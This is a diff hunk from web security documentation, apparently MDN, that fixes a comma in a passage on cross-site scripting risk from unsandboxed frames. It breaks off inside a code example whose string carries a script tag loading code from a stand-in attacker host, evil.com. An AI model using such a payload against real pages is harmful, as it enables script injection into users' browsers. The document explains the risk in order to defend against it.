@@ -50,7 +50,7 @@ If the frame is not sandboxed using the Content Security Property (CSP) [`sandbo
 This means that the frame will have complete access to the parent DOM and resources, and visa versa.
 
 This is a very significant vector for [Cross-site-scripting (XSS)](/en-US/docs/Web/Security/Attacks/XSS) attacks if potentially unsafe strings provided by a user injected into a frame without first being sanitized.
-Consider the following code where a string of HTML from a user might be passed into a frame, that is then added to the document.
+Consider the following code where a string of HTML from a user might be passed into a frame that is then added to the document.
 
 ```js
 const untrustedStringFromUser = `<!doctype html><script src="http://evil.com/naughty.js"></script>`;
